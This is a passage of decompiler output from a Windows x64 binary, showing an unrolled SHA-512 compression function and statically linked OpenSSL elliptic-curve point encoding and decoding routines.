  __int64 v97; // r8
  __int64 v98; // r14
  __int64 v99; // rbx
  __int64 v100; // r8
  __int64 v101; // r8
  unsigned __int64 v102; // r8
  __int64 v103; // r8
  unsigned __int64 v104; // [rsp+0h] [rbp-108h]
  unsigned __int64 v105; // [rsp+8h] [rbp-100h]
  unsigned __int64 v106; // [rsp+10h] [rbp-F8h]
  unsigned __int64 v107; // [rsp+18h] [rbp-F0h]
  unsigned __int64 v108; // [rsp+20h] [rbp-E8h]
  unsigned __int64 v109; // [rsp+28h] [rbp-E0h]
  unsigned __int64 v110; // [rsp+30h] [rbp-D8h]
  unsigned __int64 v111; // [rsp+38h] [rbp-D0h]
  unsigned __int64 v112; // [rsp+40h] [rbp-C8h]
  unsigned __int64 v113; // [rsp+48h] [rbp-C0h]
  unsigned __int64 v114; // [rsp+50h] [rbp-B8h]
  unsigned __int64 v115; // [rsp+58h] [rbp-B0h]
  unsigned __int64 v116; // [rsp+60h] [rbp-A8h]
  unsigned __int64 v117; // [rsp+60h] [rbp-A8h]
  unsigned __int8 *v118; // [rsp+68h] [rbp-A0h]
  unsigned __int64 v119; // [rsp+70h] [rbp-98h]
  _QWORD *v120; // [rsp+78h] [rbp-90h]
  __int64 v121; // [rsp+80h] [rbp-88h]
  __int64 v122; // [rsp+88h] [rbp-80h]
  __int64 v123; // [rsp+90h] [rbp-78h]
  __int64 v124; // [rsp+98h] [rbp-70h]
  __int64 v125; // [rsp+A0h] [rbp-68h]
  __int64 v126; // [rsp+A8h] [rbp-60h]
  __int64 v127; // [rsp+B0h] [rbp-58h]
  __int64 v128; // [rsp+B8h] [rbp-50h]
  unsigned __int64 v129; // [rsp+118h] [rbp+10h]
  __int64 v130; // [rsp+120h] [rbp+18h]
  unsigned __int64 v131; // [rsp+128h] [rbp+20h]

  if ( a3 )
  {
    v3 = *a1;
    v4 = a3;
    v5 = a1[7];
    v6 = a1[3];
    v7 = a1[2];
    v8 = a1[4];
    v9 = a1[5];
    v10 = a1[6];
    v11 = (unsigned __int8 *)(a2 + 2);
    v12 = a1[1];
    v122 = v12;
    v121 = *a1;
    v123 = v7;
    v125 = v8;
    v126 = v9;
    v127 = v10;
    v128 = v5;
    v124 = v6;
    v118 = (unsigned __int8 *)(a2 + 2);
    do
    {
      v130 = v4 - 1;
      v116 = v11[5] | ((v11[4] | ((v11[3] | ((v11[2] | ((v11[1] | ((*v11 | ((*(v11 - 1) | ((unsigned __int64)*(v11 - 2) << 8)) << 8)) << 8)) << 8)) << 8)) << 8)) << 8);
      v13 = v116
          + (v8 & v9 ^ v10 & ~v8)
          + v5
          + (__ROR8__(v8, 14) ^ __ROR8__(v8, 18) ^ __ROR8__(v8, 41))
          + 0x428A2F98D728AE22i64;
      v14 = v13 + v6;
      v15 = v13 + (__ROR8__(v3, 34) ^ __ROR8__(v3, 39) ^ __ROR8__(v3, 28)) + (v12 & v3 ^ (v12 ^ v3) & v7);
      v104 = v11[13] | ((v11[12] | ((v11[11] | ((v11[10] | ((v11[9] | ((v11[8] | ((v11[7] | ((unsigned __int64)v11[6] << 8)) << 8)) << 8)) << 8)) << 8)) << 8)) << 8);
      v16 = v104
          + v10
          + (__ROR8__(v14, 14) ^ __ROR8__(v14, 18) ^ __ROR8__(v14, 41))
          + (v14 & v8 ^ v9 & ~v14)
          + 0x7137449123EF65CDi64;
      v17 = v16 + v7;
      v18 = v16 + (__ROR8__(v15, 34) ^ __ROR8__(v15, 39) ^ __ROR8__(v15, 28)) + (v12 & v3 ^ v15 & (v12 ^ v3));
      v110 = v11[21] | ((v11[20] | ((v11[19] | ((v11[18] | ((v11[17] | ((v11[16] | ((v11[15] | ((unsigned __int64)v11[14] << 8)) << 8)) << 8)) << 8)) << 8)) << 8)) << 8);
      v19 = v110
          + v9
          + (__ROR8__(v17, 14) ^ __ROR8__(v16 + v7, 18) ^ __ROR8__(v16 + v7, 41))
          + (v17 & v14 ^ v8 & ~(v16 + v7))
          - 0x4A3F043013B2C4D1i64;
      v20 = v12 + v19;
      v21 = v19 + (__ROR8__(v18, 28) ^ __ROR8__(v18, 34) ^ __ROR8__(v18, 39)) + (v18 & v3 ^ v15 & (v18 ^ v3));
      v119 = v11[29] | ((v11[28] | ((v11[27] | ((v11[26] | ((v11[25] | ((v11[24] | ((v11[23] | ((unsigned __int64)v11[22] << 8)) << 8)) << 8)) << 8)) << 8)) << 8)) << 8);
      v22 = v119
          + v8
          + (__ROR8__(v20, 14) ^ __ROR8__(v20, 18) ^ __ROR8__(v20, 41))
          + (v20 & v17 ^ v14 & ~v20)
          - 0x164A245A7E762444i64;
      v23 = v22 + v121;
      v24 = v22 + (__ROR8__(v21, 28) ^ __ROR8__(v21, 34) ^ __ROR8__(v21, 39)) + (v21 & v18 ^ v15 & (v21 ^ v18));
      v112 = v11[37] | ((v11[36] | ((v11[35] | ((v11[34] | ((v11[33] | ((v11[32] | ((v11[31] | ((unsigned __int64)v11[30] << 8)) << 8)) << 8)) << 8)) << 8)) << 8)) << 8);
      v25 = v14
          + v112
          + (__ROR8__(v23, 14) ^ __ROR8__(v22 + v121, 18) ^ __ROR8__(v22 + v121, 41))
          + (v23 & v20 ^ v17 & ~v23)
          + 0x3956C25BF348B538i64;
      v26 = v25 + v15;
      v27 = v25 + (__ROR8__(v24, 28) ^ __ROR8__(v24, 34) ^ __ROR8__(v24, 39)) + (v24 & v21 ^ v18 & (v24 ^ v21));
      v131 = v11[45] | ((v11[44] | ((v11[43] | ((v11[42] | ((v11[41] | ((v11[40] | ((v11[39] | ((unsigned __int64)v11[38] << 8)) << 8)) << 8)) << 8)) << 8)) << 8)) << 8);
      v28 = v17
          + v131
          + (__ROR8__(v26, 14) ^ __ROR8__(v26, 18) ^ __ROR8__(v26, 41))
          + (v23 & v26 ^ v20 & ~v26)
          + 0x59F111F1B605D019i64;
      v29 = v28 + v18;
      v30 = v28 + (__ROR8__(v27, 28) ^ __ROR8__(v27, 34) ^ __ROR8__(v27, 39)) + (v27 & v24 ^ v21 & (v27 ^ v24));
      v106 = v11[53] | ((v11[52] | ((v11[51] | ((v11[50] | ((v11[49] | ((v11[48] | ((v11[47] | ((unsigned __int64)v11[46] << 8)) << 8)) << 8)) << 8)) << 8)) << 8)) << 8);
      v31 = v20
          + v106
          + (__ROR8__(v29, 14) ^ __ROR8__(v29, 18) ^ __ROR8__(v29, 41))
          + (v29 & v26 ^ v23 & ~v29)
          - 0x6DC07D5B50E6B065i64;
      v32 = v31 + v21;
      v33 = v31 + (__ROR8__(v30, 28) ^ __ROR8__(v30, 34) ^ __ROR8__(v30, 39)) + (v30 & v27 ^ v24 & (v30 ^ v27));
      v108 = v11[61] | ((v11[60] | ((v11[59] | ((v11[58] | ((v11[57] | ((v11[56] | ((v11[55] | ((unsigned __int64)v11[54] << 8)) << 8)) << 8)) << 8)) << 8)) << 8)) << 8);
      v34 = v23
          + v108
          + (__ROR8__(v32, 14) ^ __ROR8__(v32, 18) ^ __ROR8__(v32, 41))
          + (v32 & v29 ^ v26 & ~v32)
          - 0x54E3A12A25927EE8i64;
      v35 = v34 + v24;
      v36 = v34 + (__ROR8__(v33, 28) ^ __ROR8__(v33, 34) ^ __ROR8__(v33, 39)) + (v33 & v30 ^ v27 & (v33 ^ v30));
      v111 = v11[69] | ((v11[68] | ((v11[67] | ((v11[66] | ((v11[65] | ((v11[64] | ((v11[63] | ((unsigned __int64)v11[62] << 8)) << 8)) << 8)) << 8)) << 8)) << 8)) << 8);
      v37 = v26
          + v111
          + (__ROR8__(v35, 14) ^ __ROR8__(v35, 18) ^ __ROR8__(v35, 41))
          + (v35 & v32 ^ v29 & ~v35)
          - 0x27F855675CFCFDBEi64;
      v38 = v37 + v27;
      v39 = v37 + (__ROR8__(v36, 34) ^ __ROR8__(v36, 39) ^ __ROR8__(v36, 28)) + (v36 & v33 ^ v30 & (v36 ^ v33));
      v129 = v118[77] | ((v118[76] | ((v118[75] | ((v118[74] | ((v118[73] | ((v118[72] | ((v118[71] | ((unsigned __int64)v118[70] << 8)) << 8)) << 8)) << 8)) << 8)) << 8)) << 8);
      v40 = v29
          + v129
          + (__ROR8__(v38, 14) ^ __ROR8__(v38, 18) ^ __ROR8__(v38, 41))
          + (v38 & v35 ^ v32 & ~v38)
          + 0x12835B0145706FBEi64;
      v41 = v40 + v30;
      v42 = v40 + (__ROR8__(v39, 34) ^ __ROR8__(v39, 39) ^ __ROR8__(v39, 28)) + (v36 & v33 ^ v39 & (v36 ^ v33));
      v105 = v118[85] | ((v118[84] | ((v118[83] | ((v118[82] | ((v118[81] | ((v118[80] | ((v118[79] | ((unsigned __int64)v118[78] << 8)) << 8)) << 8)) << 8)) << 8)) << 8)) << 8);
      v43 = v32
          + v105
          + (__ROR8__(v41, 14) ^ __ROR8__(v41, 18) ^ __ROR8__(v41, 41))
          + (v41 & v38 ^ v35 & ~v41)
          + 0x243185BE4EE4B28Ci64;
      v44 = v43 + v33;
      v45 = v43 + (__ROR8__(v42, 28) ^ __ROR8__(v42, 34) ^ __ROR8__(v42, 39)) + (v36 & v42 ^ v39 & (v36 ^ v42));
      v113 = v118[93] | ((v118[92] | ((v118[91] | ((v118[90] | ((v118[89] | ((v118[88] | ((v118[87] | ((unsigned __int64)v118[86] << 8)) << 8)) << 8)) << 8)) << 8)) << 8)) << 8);
      v46 = v35
          + v113
          + (__ROR8__(v44, 14) ^ __ROR8__(v44, 18) ^ __ROR8__(v44, 41))
          + (v44 & v41 ^ v38 & ~v44)
          + 0x550C7DC3D5FFB4E2i64;
      v47 = v46 + v36;
      v48 = v46 + (__ROR8__(v45, 28) ^ __ROR8__(v45, 34) ^ __ROR8__(v45, 39)) + (v45 & v42 ^ v39 & (v45 ^ v42));
      v107 = v118[101] | ((v118[100] | ((v118[99] | ((v118[98] | ((v118[97] | ((v118[96] | ((v118[95] | ((unsigned __int64)v118[94] << 8)) << 8)) << 8)) << 8)) << 8)) << 8)) << 8);
      v49 = v38
          + v107
          + (__ROR8__(v47, 14) ^ __ROR8__(v47, 18) ^ __ROR8__(v47, 41))
          + (v47 & v44 ^ v41 & ~v47)
          + 0x72BE5D74F27B896Fi64;
      v50 = v49 + v39;
      v51 = v49 + (__ROR8__(v48, 28) ^ __ROR8__(v48, 34) ^ __ROR8__(v48, 39)) + (v48 & v45 ^ v42 & (v48 ^ v45));
      v114 = v118[109] | ((v118[108] | ((v118[107] | ((v118[106] | ((v118[105] | ((v118[104] | ((v118[103] | ((unsigned __int64)v118[102] << 8)) << 8)) << 8)) << 8)) << 8)) << 8)) << 8);
      v52 = v41
          + v114
          + (__ROR8__(v50, 14) ^ __ROR8__(v50, 18) ^ __ROR8__(v50, 41))
          + (v47 & v50 ^ v44 & ~v50)
          - 0x7F214E01C4E9694Fi64;
      v53 = v52 + v42;
      v54 = v52 + (__ROR8__(v51, 28) ^ __ROR8__(v51, 34) ^ __ROR8__(v51, 39)) + (v51 & v48 ^ v45 & (v51 ^ v48));
      v55 = v118[117] | ((v118[116] | ((v118[115] | ((v118[114] | ((v118[113] | ((v118[112] | ((v118[111] | ((unsigned __int64)v118[110] << 8)) << 8)) << 8)) << 8)) << 8)) << 8)) << 8);
      v115 = v55;
      v56 = v44
          + v55
          + (__ROR8__(v53, 14) ^ __ROR8__(v53, 18) ^ __ROR8__(v53, 41))
          + (v53 & v50 ^ v47 & ~v53)
          - 0x6423F958DA38EDCBi64;
      v57 = v56 + v45;
      v58 = v56 + (__ROR8__(v54, 28) ^ __ROR8__(v54, 34) ^ __ROR8__(v54, 39)) + (v54 & v51 ^ v48 & (v54 ^ v51));
      v109 = v118[125] | ((v118[124] | ((v118[123] | ((v118[122] | ((v118[121] | ((v118[120] | ((v118[119] | ((unsigned __int64)v118[118] << 8)) << 8)) << 8)) << 8)) << 8)) << 8)) << 8);
      v59 = &unk_1400F6890;
      v120 = &unk_1400F6890;
      v60 = v47
          + v109
          + (__ROR8__(v57, 14) ^ __ROR8__(v57, 18) ^ __ROR8__(v57, 41))
          + (v57 & v53 ^ v50 & ~v57)
          - 0x3E640E8B3096D96Ci64;
      v61 = v116;
      v62 = v60 + v48;
      v63 = v60 + (__ROR8__(v58, 28) ^ __ROR8__(v58, 34) ^ __ROR8__(v58, 39)) + (v58 & v54 ^ v51 & (v58 ^ v54));
      do
      {
        v117 = ((v55 >> 6) ^ __ROR8__(v55, 19) ^ __ROR8__(v55, 61))
             + v129
             + ((v104 >> 7) ^ __ROR8__(v104, 1) ^ __ROR8__(v104, 8))
             + v61;
        v64 = v50
            + v117
            + *(v59 - 2)
            + (v62 & v57 ^ v53 & ~v62)
            + (__ROR8__(v62, 14) ^ __ROR8__(v62, 18) ^ __ROR8__(v62, 41));
        v65 = v64 + v51;
        v66 = v64 + (__ROR8__(v63, 34) ^ __ROR8__(v63, 39) ^ __ROR8__(v63, 28)) + (v63 & v58 ^ v54 & (v63 ^ v58));
        v104 += ((v109 >> 6) ^ __ROR8__(v109, 19) ^ __ROR8__(v109, 61))
              + v105
              + ((v110 >> 7) ^ __ROR8__(v110, 1) ^ __ROR8__(v110, 8));
        v67 = v53
            + v104
            + *(v120 - 1)
            + (v65 & v62 ^ v57 & ~v65)
            + (__ROR8__(v65, 14) ^ __ROR8__(v65, 18) ^ __ROR8__(v65, 41));
        v68 = v67 + v54;
        v69 = v67 + (__ROR8__(v66, 34) ^ __ROR8__(v66, 39) ^ __ROR8__(v66, 28)) + (v63 & v58 ^ v66 & (v63 ^ v58));
        v110 += ((v119 >> 7) ^ __ROR8__(v119, 1) ^ __ROR8__(v119, 8))
              + v113
              + ((v117 >> 6) ^ __ROR8__(v117, 19) ^ __ROR8__(v117, 61));
        v70 = *v120
            + v57
            + v110
            + (__ROR8__(v68, 14) ^ __ROR8__(v68, 18) ^ __ROR8__(v68, 41))
            + (v68 & v65 ^ v62 & ~v68);
        v71 = v70 + v58;
        v72 = v70 + (__ROR8__(v69, 28) ^ __ROR8__(v69, 34) ^ __ROR8__(v69, 39)) + (v63 & v69 ^ v66 & (v63 ^ v69));
        v119 += ((v112 >> 7) ^ __ROR8__(v112, 1) ^ __ROR8__(v112, 8))
              + v107
              + ((v104 >> 6) ^ __ROR8__(v104, 19) ^ __ROR8__(v104, 61));
        v73 = v62
            + v119
            + v120[1]
            + (v71 & v68 ^ v65 & ~v71)
            + (__ROR8__(v71, 14) ^ __ROR8__(v71, 18) ^ __ROR8__(v71, 41));
        v74 = v73 + v63;
        v75 = v73 + (__ROR8__(v72, 28) ^ __ROR8__(v72, 34) ^ __ROR8__(v72, 39)) + (v72 & v69 ^ v66 & (v72 ^ v69));
        v112 += ((v131 >> 7) ^ __ROR8__(v131, 1) ^ __ROR8__(v131, 8))
              + v114
              + ((v110 >> 6) ^ __ROR8__(v110, 19) ^ __ROR8__(v110, 61));
        v76 = v65
            + v112
            + v120[2]
            + (v74 & v71 ^ v68 & ~v74)
            + (__ROR8__(v74, 14) ^ __ROR8__(v74, 18) ^ __ROR8__(v74, 41));
        v77 = v76 + v66;
        v78 = v76 + (__ROR8__(v75, 28) ^ __ROR8__(v75, 34) ^ __ROR8__(v75, 39)) + (v75 & v72 ^ v69 & (v75 ^ v72));
        v131 += ((v106 >> 7) ^ __ROR8__(v106, 1) ^ __ROR8__(v106, 8))
              + v115
              + ((v119 >> 6) ^ __ROR8__(v119, 19) ^ __ROR8__(v119, 61));
        v79 = v68
            + v131
            + v120[3]
            + (v74 & v77 ^ v71 & ~v77)
            + (__ROR8__(v77, 14) ^ __ROR8__(v77, 18) ^ __ROR8__(v77, 41));
        v80 = v79 + v69;
        v81 = v79 + (__ROR8__(v78, 28) ^ __ROR8__(v78, 34) ^ __ROR8__(v78, 39)) + (v78 & v75 ^ v72 & (v78 ^ v75));
        v106 += ((v108 >> 7) ^ __ROR8__(v108, 1) ^ __ROR8__(v108, 8))
              + v109
              + ((v112 >> 6) ^ __ROR8__(v112, 19) ^ __ROR8__(v112, 61));
        v82 = v71
            + v106
            + v120[4]
            + (v80 & v77 ^ v74 & ~v80)
            + (__ROR8__(v80, 14) ^ __ROR8__(v80, 18) ^ __ROR8__(v80, 41));
        v83 = v82 + v72;
        v84 = v82 + (__ROR8__(v81, 28) ^ __ROR8__(v81, 34) ^ __ROR8__(v81, 39)) + (v81 & v78 ^ v75 & (v81 ^ v78));
        v108 += ((v111 >> 7) ^ __ROR8__(v111, 1) ^ __ROR8__(v111, 8))
              + v117
              + ((v131 >> 6) ^ __ROR8__(v131, 19) ^ __ROR8__(v131, 61));
        v85 = v74
            + v108
            + v120[5]
            + (v83 & v80 ^ v77 & ~v83)
            + (__ROR8__(v83, 14) ^ __ROR8__(v83, 18) ^ __ROR8__(v83, 41));
        v86 = v85 + v75;
        v87 = v85 + (__ROR8__(v84, 28) ^ __ROR8__(v84, 34) ^ __ROR8__(v84, 39)) + (v84 & v81 ^ v78 & (v84 ^ v81));
        v111 += v104
              + ((v129 >> 7) ^ __ROR8__(v129, 1) ^ __ROR8__(v129, 8))
              + ((v106 >> 6) ^ __ROR8__(v106, 19) ^ __ROR8__(v106, 61));
        v88 = v77
            + v111
            + v120[6]
            + (v86 & v83 ^ v80 & ~v86)
            + (__ROR8__(v86, 14) ^ __ROR8__(v86, 18) ^ __ROR8__(v86, 41));
        v89 = v88 + v78;
        v90 = v88 + (__ROR8__(v87, 34) ^ __ROR8__(v87, 39) ^ __ROR8__(v87, 28)) + (v87 & v84 ^ v81 & (v87 ^ v84));
        v129 += ((v105 >> 7) ^ __ROR8__(v105, 1) ^ __ROR8__(v105, 8))
              + v110
              + ((v108 >> 6) ^ __ROR8__(v108, 19) ^ __ROR8__(v108, 61));
        v91 = v80
            + v129
            + v120[7]
            + (v89 & v86 ^ v83 & ~v89)
            + (__ROR8__(v89, 14) ^ __ROR8__(v89, 18) ^ __ROR8__(v89, 41));
        v92 = v91 + v81;
        v93 = v91 + (__ROR8__(v90, 34) ^ __ROR8__(v90, 39) ^ __ROR8__(v90, 28)) + (v87 & v84 ^ v90 & (v87 ^ v84));
        v105 += v119
              + ((v113 >> 7) ^ __ROR8__(v113, 1) ^ __ROR8__(v113, 8))
              + ((v111 >> 6) ^ __ROR8__(v111, 19) ^ __ROR8__(v111, 61));
        v94 = v83
            + v105
            + v120[8]
            + (v92 & v89 ^ v86 & ~v92)
            + (__ROR8__(v92, 14) ^ __ROR8__(v92, 18) ^ __ROR8__(v92, 41));
        v95 = v94 + v84;
        v96 = v94 + (__ROR8__(v93, 28) ^ __ROR8__(v93, 34) ^ __ROR8__(v93, 39)) + (v87 & v93 ^ v90 & (v87 ^ v93));
        v113 += ((v107 >> 7) ^ __ROR8__(v107, 1) ^ __ROR8__(v107, 8))
              + v112
              + ((v129 >> 6) ^ __ROR8__(v129, 19) ^ __ROR8__(v129, 61));
        v97 = v86
            + v113
            + v120[9]
            + (v95 & v92 ^ v89 & ~v95)
            + (__ROR8__(v95, 14) ^ __ROR8__(v95, 18) ^ __ROR8__(v95, 41));
        v98 = v97 + v87;
        v99 = v97 + (__ROR8__(v96, 28) ^ __ROR8__(v96, 34) ^ __ROR8__(v96, 39)) + (v96 & v93 ^ v90 & (v96 ^ v93));
        v107 += ((v114 >> 7) ^ __ROR8__(v114, 1) ^ __ROR8__(v114, 8))
              + v131
              + ((v105 >> 6) ^ __ROR8__(v105, 19) ^ __ROR8__(v105, 61));
        v100 = v89
             + v107
             + v120[10]
             + (v98 & v95 ^ v92 & ~v98)
             + (__ROR8__(v98, 14) ^ __ROR8__(v98, 18) ^ __ROR8__(v98, 41));
        v50 = v100 + v90;
        v51 = v100 + (__ROR8__(v99, 28) ^ __ROR8__(v99, 34) ^ __ROR8__(v99, 39)) + (v99 & v96 ^ v93 & (v99 ^ v96));
        v114 += ((v115 >> 7) ^ __ROR8__(v115, 1) ^ __ROR8__(v115, 8))
              + v106
              + ((v113 >> 6) ^ __ROR8__(v113, 19) ^ __ROR8__(v113, 61));
        v101 = v92
             + v114
             + v120[11]
             + (v98 & v50 ^ v95 & ~v50)
             + (__ROR8__(v50, 14) ^ __ROR8__(v50, 18) ^ __ROR8__(v50, 41));
        v53 = v101 + v93;
        v54 = v101 + (__ROR8__(v51, 28) ^ __ROR8__(v51, 34) ^ __ROR8__(v51, 39)) + (v51 & v99 ^ v96 & (v51 ^ v99));
        v55 = ((v109 >> 7) ^ __ROR8__(v109, 1) ^ __ROR8__(v109, 8))
            + v108
            + ((v107 >> 6) ^ __ROR8__(v107, 19) ^ __ROR8__(v107, 61))
            + v115;
        v115 = v55;
        v102 = v95
             + v55
             + v120[12]
             + (v53 & v50 ^ v98 & ~v53)
             + (__ROR8__(v53, 14) ^ __ROR8__(v53, 18) ^ __ROR8__(v53, 41));
        v57 = v102 + v96;
        v58 = v102 + (__ROR8__(v54, 28) ^ __ROR8__(v54, 34) ^ __ROR8__(v54, 39)) + (v54 & v51 ^ v99 & (v54 ^ v51));
        v61 = v117;
        v109 += v111
              + ((v114 >> 6) ^ __ROR8__(v114, 19) ^ __ROR8__(v114, 61))
              + ((v117 >> 7) ^ __ROR8__(v117, 1) ^ __ROR8__(v117, 8));
        v103 = v98
             + v109
             + v120[13]
             + (v57 & v53 ^ v50 & ~v57)
             + (__ROR8__(v57, 14) ^ __ROR8__(v57, 18) ^ __ROR8__(v57, 41));
        v59 = v120 + 16;
        v120 = v59;
        v62 = v103 + v99;
        v63 = v103 + (__ROR8__(v58, 28) ^ __ROR8__(v58, 34) ^ __ROR8__(v58, 39)) + (v58 & v54 ^ v51 & (v58 ^ v54));
      }
      while ( (__int64)v59 < (__int64)"1.0f\\crypto\\ec\\ecp_oct.c" );
      v3 = v63 + v121;
      v6 = v51 + v124;
      v12 = v58 + v122;
      v9 = v57 + v126;
      v7 = v54 + v123;
      v5 = v50 + v128;
      v10 = v53 + v127;
      v8 = v62 + v125;
      v4 = v130;
      v11 = v118 + 128;
      v121 = v3;
      *a1 = v3;
      v122 = v12;
      a1[1] = v12;
      v123 = v7;
      a1[2] = v7;
      v124 = v6;
      a1[3] = v6;
      v125 = v8;
      a1[4] = v8;
      v126 = v9;
      a1[5] = v9;
      v127 = v10;
      a1[6] = v10;
      v128 = v5;
      a1[7] = v5;
      v118 += 128;
    }
    while ( v130 );
  }
}
// 140042B20: too many cbuild loops

//----- (0000000140044720) ----------------------------------------------------
__int64 *sub_140044720()
{
  void *v0; // rax
  __int64 *v1; // rax
  __int64 *v2; // rbx

  v0 = sub_1400794D0();
  v1 = sub_140021BE0((__int64)v0);
  v2 = v1;
  if ( !v1 )
    return 0i64;
  if ( !(unsigned int)sub_140021D80((__int64)v1) )
  {
    sub_140021350(v2);
    return 0i64;
  }
  return v2;
}

//----- (00000001400447B0) ----------------------------------------------------
__int64 *__fastcall sub_1400447B0(__int64 *a1)
{
  void *v1; // rax
  __int64 *v2; // rax
  __int64 *v3; // rbx

  if ( sub_140077950(a1) )
    v1 = sub_140078280();
  else
    v1 = sub_140077F10();
  v2 = sub_140021BE0((__int64)v1);
  v3 = v2;
  if ( !v2 )
    return 0i64;
  if ( !(unsigned int)sub_140021DD0((__int64)v2) )
  {
    sub_140021350(v3);
    return 0i64;
  }
  return v3;
}

//----- (0000000140044850) ----------------------------------------------------
__int64 __fastcall sub_140044850(__int64 *a1, _QWORD *a2, _BYTE *a3, __int64 a4, int *a5)
{
  int v5; // eax
  int *v6; // r15
  int v10; // r14d
  int v11; // ebx
  __int64 v12; // r13
  __int64 v13; // rax
  int *v14; // rdi
  __int64 *v15; // r12
  __int64 *v16; // rbp
  unsigned int v17; // eax
  unsigned int v20; // [rsp+88h] [rbp+20h]

  v6 = 0i64;
  v20 = 0;
  if ( !a4 )
  {
    sub_140024610(v5 - 64, v5 + 23, v5 + 20, (__int64)&unk_1400F6A80, 285);
    return 0i64;
  }
  v10 = *a3 & 1;
  v11 = *a3 & 0xFE;
  switch ( v11 )
  {
    case 0:
      goto LABEL_9;
    case 2:
      break;
    case 4:
LABEL_9:
      if ( (*a3 & 1) != 0 )
      {
        sub_140024610(16, 103, 102, (__int64)&unk_1400F6A80, 298);
        return 0i64;
      }
      break;
    case 6:
      break;
    default:
      sub_140024610(16, 103, 102, (__int64)&unk_1400F6A80, 294);
      return 0i64;
  }
  if ( v11 )
  {
    v12 = (int)(sub_140027260(a1[8]) + 7) / 8;
    v13 = v12 + 1;
    if ( v11 != 2 )
      v13 = 2 * v12 + 1;
    if ( a4 != v13 )
    {
      sub_140024610(16, 103, 102, (__int64)&unk_1400F6A80, 317);
      return 0i64;
    }
    v14 = a5;
    if ( !a5 )
    {
      v6 = (int *)sub_140027CD0();
      v14 = v6;
      if ( !v6 )
        return 0i64;
    }
    sub_140027D40(v14);
    v15 = sub_140027C40(v14);
    v16 = sub_140027C40(v14);
    if ( v16 && sub_140026840(a3 + 1, v12, (__int64)v15) )
    {
      if ( (int)sub_140027600(v15, (__int64 *)a1[8]) >= 0 )
      {
        sub_140024610(16, 103, 102, (__int64)&unk_1400F6A80, 336);
        goto LABEL_39;
      }
      if ( v11 == 2 )
      {
        v17 = (unsigned int)sub_140029000(a1, a2, (__int64)v15, v10, v14);
        goto LABEL_37;
      }
      if ( sub_140026840(&a3[v12 + 1], v12, (__int64)v16) )
      {
        if ( (int)sub_140027600(v16, (__int64 *)a1[8]) < 0 )
        {
          if ( v11 != 6 || v10 == sub_1400270F0((__int64)v16) )
          {
            v17 = sub_1400228F0((__int64)a1, a2);
LABEL_37:
            if ( v17 )
              v20 = 1;
            goto LABEL_39;
          }
          sub_140024610(16, 103, 102, (__int64)&unk_1400F6A80, 353);
        }
        else
        {
          sub_140024610(16, 103, 102, (__int64)&unk_1400F6A80, 348);
        }
      }
    }
LABEL_39:
    sub_140027B60((__int64)v14);
    sub_140027BE0((__int64)v6);
    return v20;
  }
  if ( a4 != 1 )
  {
    sub_140024610(16, 103, 102, (__int64)&unk_1400F6A80, 304);
    return 0i64;
  }
  return sub_1400229F0((__int64)a1, a2);
}
// 1400448E0: conditional instruction was optimized away because ebx.4 is in (==2|==6)
// 140044893: variable 'v5' is possibly undefined

//----- (0000000140044B00) ----------------------------------------------------
__int64 __fastcall sub_140044B00(__int64 a1, _QWORD *a2, int a3, _BYTE *a4, unsigned __int64 a5, int *a6)
{
  int *v6; // r15
  __int64 v11; // kr08_8
  unsigned __int64 v12; // r12
  __int64 v13; // rax
  unsigned __int64 v14; // r13
  int *v15; // r14
  __int64 v16; // rdi
  __int64 v17; // rbx
  unsigned __int64 v18; // rdx
  __int64 v19; // rbx
  unsigned __int64 v20; // rdx
  _BYTE *v21; // rdi
  _QWORD *v22; // [rsp+30h] [rbp-38h]
  _QWORD *v23; // [rsp+38h] [rbp-30h]

  v6 = 0i64;
  if ( ((a3 - 2) & 0xFFFFFFF9) != 0 || a3 == 8 )
  {
    sub_140024610(16, 104, 104, (__int64)&unk_1400F6A80, 172);
    goto LABEL_40;
  }
  if ( !(unsigned int)sub_140022480(a1, a2) )
  {
    v11 = (int)(sub_140027260(*(_QWORD *)(a1 + 64)) + 7);
    v12 = ((BYTE4(v11) & 7) + (int)v11) >> 3;
    v13 = v12;
    if ( a3 != 2 )
      v13 = 2 * v12;
    v14 = v13 + 1;
    if ( a4 )
    {
      if ( a5 < v14 )
      {
        sub_140024610(16, 104, 100, (__int64)&unk_1400F6A80, 197);
LABEL_40:
        sub_140027BE0((__int64)v6);
        return 0i64;
      }
      v15 = a6;
      if ( !a6 )
      {
        v6 = (int *)sub_140027CD0();
        v15 = v6;
        if ( !v6 )
          return 0i64;
      }
      sub_140027D40(v15);
      v22 = sub_140027C40(v15);
      v23 = sub_140027C40(v15);
      v16 = (__int64)v23;
      if ( !v23 || !(unsigned int)sub_140022380(a1, a2) )
      {
LABEL_24:
        sub_140027B60((__int64)v15);
        goto LABEL_40;
      }
      if ( ((a3 - 2) & 0xFFFFFFFB) != 0 || !sub_1400270F0((__int64)v23) )
        *a4 = a3;
      else
        *a4 = a3 + 1;
      v17 = 1i64;
      v18 = v12 - (int)(sub_140027260((__int64)v22) + 7) / 8;
      if ( v18 > v12 )
      {
        sub_140024610(16, 104, 68, (__int64)&unk_1400F6A80, 227);
        goto LABEL_24;
      }
      if ( v18 )
      {
        v17 = v18 + 1;
        memset(a4 + 1, 0, v18);
        v16 = (__int64)v23;
      }
      v19 = (int)sub_1400269C0((__int64)v22, &a4[v17]) + v17;
      if ( v19 != v12 + 1 )
      {
        sub_140024610(16, 104, 68, (__int64)&unk_1400F6A80, 237);
        goto LABEL_24;
      }
      if ( ((a3 - 4) & 0xFFFFFFFD) == 0 )
      {
        v20 = v12 - (int)(sub_140027260(v16) + 7) / 8;
        if ( v20 > v12 )
        {
          sub_140024610(16, 104, 68, (__int64)&unk_1400F6A80, 245);
          goto LABEL_24;
        }
        if ( v20 )
        {
          v21 = &a4[v19];
          v19 += v20;
          memset(v21, 0, v20);
          v16 = (__int64)v23;
        }
        v19 += (int)sub_1400269C0(v16, &a4[v19]);
      }
      if ( v19 != v14 )
      {
        sub_140024610(16, 104, 68, (__int64)&unk_1400F6A80, 257);
        goto LABEL_24;
      }
      sub_140027B60((__int64)v15);
    }
    sub_140027BE0((__int64)v6);
    return v14;
  }
  if ( !a4 )
    return 1i64;
  if ( a5 )
  {
    *a4 = 0;
    return 1i64;
  }
  sub_140024610(16, 104, 100, (__int64)&unk_1400F6A80, 180);
  return 0i64;
}

//----- (0000000140044DF0) ----------------------------------------------------
int *__fastcall sub_140044DF0(__int64 *a1, _QWORD *a2, __int64 a3, int a4, int *a5)
{
  unsigned int v5; // r13d
  int *v9; // rdi
  int *result; // rax
  __int64 *v11; // rbp
  __int64 *v12; // rsi
  _QWORD *v13; // r12
  __int64 *v14; // r14
  int v15; // eax
  int v16; // eax
